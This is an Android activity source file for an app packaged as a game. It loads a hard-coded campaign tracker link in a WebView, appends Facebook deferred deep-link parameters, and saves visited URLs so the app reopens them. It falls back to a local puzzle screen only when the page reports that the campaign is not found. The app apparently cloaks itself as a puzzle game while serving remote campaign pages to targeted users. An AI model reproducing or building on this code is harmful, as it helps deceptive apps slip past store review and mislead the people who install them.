package ltd.starthub.game.evernote;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabColorSchemeParams;
import androidx.browser.customtabs.CustomTabsCallback;
import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;
import androidx.browser.customtabs.TrustedWebUtils;
import androidx.core.content.ContextCompat;

import android.content.ComponentName;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ProgressBar;

import com.facebook.CustomTabActivity;
import com.facebook.applinks.AppLinkData;
import com.onesignal.OneSignal;

import java.util.List;
import java.util.concurrent.TimeUnit;

import bolts.AppLinks;

import static ltd.starthub.game.evernote.Preferance.APP_COOK;
import static ltd.starthub.game.evernote.Preferance.APP_First;
import static ltd.starthub.game.evernote.Preferance.APP_PREFERENCES;
import static ltd.starthub.game.evernote.Preferance.APP_PREFERENCES_NAME;

public class MainActivity extends AppCompatActivity {

    private static final String ONESIGNAL_APP_ID = "52ee83b5-3411-4892-84a1-6580ae06b626";

    public ProgressBar progressBar;
    //  public Tracker mTracker;
    public CookieManager cookieManager;
    public WebView webView;
    //   String url;

    public boolean isdeeplink;


    SharedPreferences.Editor editor;
    SharedPreferences mSettings;

     String url = "https://scnddmn.com/7vZTBtvQ";
    public static final String CUSTOM_TAB_PACKAGE_NAME = "com.android.chrome";

    CustomTabsClient mClient;
    CustomTabsSession mCustomTabsSession;
    CustomTabsServiceConnection mCustomTabsServiceConnection;
    CustomTabsIntent customTabsIntent;
    CustomTabActivity customTabActivity;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        progressBar = findViewById(R.id.loading);
        webView = findViewById(R.id.webView2);

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
        // OneSignal Initialization
        OneSignal.initWithContext(this);
        OneSignal.setAppId(ONESIGNAL_APP_ID);

        mSettings = this.getSharedPreferences(APP_PREFERENCES, 0);
        editor = mSettings.edit();
        editor.putString(APP_First, "CAT");
        editor.commit();

        isdeeplink= false;
//        mCustomTabsServiceConnection = new CustomTabsServiceConnection() {
//            @Override
//            public void onCustomTabsServiceConnected(ComponentName name, CustomTabsClient client) {
//                mClient = client;
//                mClient.warmup(0L);
//                mCustomTabsSession = mClient.newSession(null);
//                mCustomTabsSession.mayLaunchUrl(Uri.parse(url),null,null);
////                CustomTabsSession session = mClient.newSession(new CustomTabsCallback());
////                session.mayLaunchUrl(Uri.parse("https://www.google.com"), null, null);
//            }
//
//            @Override
//            public void onServiceDisconnected(ComponentName name) {
//                Log.d("TAG","onServiceDisconnected");
//                mClient = null;
//
//            }
//        };
//        boolean ok = CustomTabsClient.bindCustomTabsService(this, CUSTOM_TAB_PACKAGE_NAME, mCustomTabsServiceConnection);
//        if(ok) {
//            Log.d("TAG", "okkkkkkkkkkkkkkkkkkk");
//        }



//
//        CustomTabColorSchemeParams params = new CustomTabColorSchemeParams.Builder()
//                .setNavigationBarColor(ContextCompat.getColor(this,R.color.background))
//                .setToolbarColor(ContextCompat.getColor(this,R.color.background))
//                .setSecondaryToolbarColor(ContextCompat.getColor(this,R.color.background))
//                .build();
//
//        customTabsIntent = new CustomTabsIntent.Builder(mCustomTabsSession)
//                .setColorSchemeParams(CustomTabsIntent.COLOR_SCHEME_DARK, params)
//                .setStartAnimations(this, R.anim.slide_in_right,R.anim.slide_out_left)
//                .setExitAnimations(this,android.R.anim.slide_in_left,android.R.anim.slide_out_right)
//                .build();
////        builder.setColorSchemeParams(CustomTabsIntent.COLOR_SCHEME_DARK, params);
////        builder.setStartAnimations(this, R.anim.slide_in_right,R.anim.slide_out_left);
////        builder.setExitAnimations(this,android.R.anim.slide_in_left,android.R.anim.slide_out_right);
////        CustomTabsIntent customTabsIntent = builder.build();
//
//        customTabsIntent.launchUrl(this, Uri.parse(url));





        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setDatabaseEnabled(true);
        webSettings.setUserAgentString(webView.getSettings().getUserAgentString() +
                "MobileAppClient/Android/0.9");

        webSettings.setAppCachePath("/data/data/" + getPackageName() + "/cache");
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        webSettings.setAppCacheEnabled(true);

        cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        if (Build.VERSION.SDK_INT >= 21) {
            cookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        }




        String cookurl = mSettings.getString(APP_COOK,"");

        if(cookurl=="") {
            webView.loadUrl(url);
        }else {
         webView.loadUrl(cookurl);
        }

        webView.setWebChromeClient(new WebChromeClient(){

            @Override
            public void onReceivedTitle(WebView view, String title) {
                super.onReceivedTitle(view, title);
                CharSequence pnotfound = "The page cannot be found";
                CharSequence pnotfound2 = "404";
                CharSequence pnotfound3 = "Default campaign not found";
                CharSequence pnotfound4 = "Not found";
                Log.d("TAG",title);
                if (title.contains(pnotfound) || title.contains(pnotfound2)|| title.contains(pnotfound3) || title.contains(pnotfound4)){
                    Intent intent = new Intent(MainActivity.this, puzzleactivity.class);
                    startActivity(intent);
                    overridePendingTransition(R.anim.slide_in_right , R.anim.slide_out_left);

                }

            }
        });
        webView.setWebViewClient(new WebViewClient() {

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                Log.d("TAG", "onPageStartedonPageStartedonPageStarted");
                Log.d("TAG", url);

                editor.putString(APP_COOK, url);
                editor.commit();

            }




                @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {

                    if (isdeeplink) {
                        Uri uri = request.getUrl();
                        String url = uri.toString();
                        editor.putString(APP_COOK, url);
                        editor.commit();
                        view.loadUrl(url);

                    }


                return false;
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                progressBar.setVisibility(View.GONE);

//
//                Log.d("TAG", url);
//                mTracker.setScreenName("Screen" + screen );
//                mTracker.set("url", url);
//                mTracker.send(new HitBuilders.ScreenViewBuilder().build());
                Log.d("TAG", " onPageFinished onPageFinished onPageFinished onPageFinished");

            }

        });

    }

    @Override
    protected void onStart() {
        super.onStart();
        initFacebook();
    }



    private void initFacebook() {



        AppLinkData.fetchDeferredAppLinkData(this,getString(R.string.facebook_app_id),
                new AppLinkData.CompletionHandler() {
                    @Override
                    public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                        // Process app link data

                        Uri targetUrl = AppLinks.getTargetUrl(getIntent());
                        if (targetUrl != null) {

                            String deepurl = targetUrl.toString();
                            int indx = deepurl.indexOf("?");
                            Log.d("TAG",   String.valueOf(indx));
                            String last = deepurl.substring(indx);


                            webView.post(new Runnable() {
                                @Override
                                public void run() {
                                    isdeeplink = true;
                                    url = url + last;
                                    webView.loadUrl(url);
                                }
                            });

                        }
                    }
                }
        );
    }


    @Override
    public void onBackPressed() {
        if (webView.canGoBack()){
            webView.goBack();
        }
        else {
            new AlertDialog.Builder(this)
                    .setIcon(android.R.drawable.ic_dialog_alert)
                    .setTitle(R.string.confirmation_close_app)
                    .setPositiveButton(R.string.close_button, new DialogInterface.OnClickListener() {

                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            finishAffinity();

                        }

                    })
                    .setNegativeButton(R.string.cancel_button, null)
                    .show();

        }
    }




}